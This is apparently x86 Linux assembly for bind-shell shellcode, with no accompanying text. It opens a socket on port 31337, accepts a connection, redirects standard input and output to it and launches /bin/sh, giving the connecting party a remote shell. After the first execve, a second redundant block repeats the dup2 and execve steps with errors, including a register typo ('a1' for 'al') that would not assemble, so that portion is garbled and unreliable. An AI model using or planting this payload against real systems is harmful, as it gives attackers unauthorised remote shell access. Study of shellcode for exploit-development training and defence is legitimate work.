BITS 32

    push BYTE 0x66 ; socket system call 102
    pop eax
    cdq
    xor ebx, ebx
    inc ebx
    push edx
    push BYTE 0x1
    push BYTE 0x2
    mov ecx, esp
    int 0x80 ; system call => eax fd

    xchg esi, eax ; fd save on esi

    ; bind(s, [2, 31337, 0], 16)

    push BYTE 0x66
    pop eax
    inc ebx
    push edx
    push WORD 0x697a
    push WORD bx
    mov ecx, esp
    push BYTE 16
    push ecx
    push esi
    mov ecx, esp
    int 0x80 ; success return eax = 0;

    mov BYTE al, 0x66
    inc ebx
    inc ebx
    push ebx
    push esi
    mov ecx, esp
    int 0x80

    mov BYTE al, 0x66
    inc ebx
    push edx
    push edx
    push esi
    mov ecx, esp
    int 0x80
    
    xchg eax, ebx
    push BYTE 0x2
    pop ecx
dup_loop:
    mov BYTE al, 0x3F
    int 0x80
    dec ecx
    jns dup_loop

    mov BYTE al, 11
    push edx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    push edx
    mov edx, esp
    push ebx
    mov ecx, esp
    int 0x80

    mov ebx, eax
    push BYTE 0x3F
    pop eax
    xor ecx, ecx ; inital 0
    int 0x80 ; syscall
    mov BYTE al, 0x3F
    inc ecx
    int 0x80 ; syscall
    mov BYTE al, 0x3F
    inc ecx
    int 0x80 ; syscall

; execve(const char *filename, char *const argv[], char *const envp[])

    mov BYTE a1, 11
    push edx
    push 0x68732f2f ; //sh
    push 0x6e69622f ; /bin
    mov ebx, esp
    push ecx
    mov edx, esp
    push ebx ; ? edx
    mov ecx, esp
    int 0x80 ; syscall


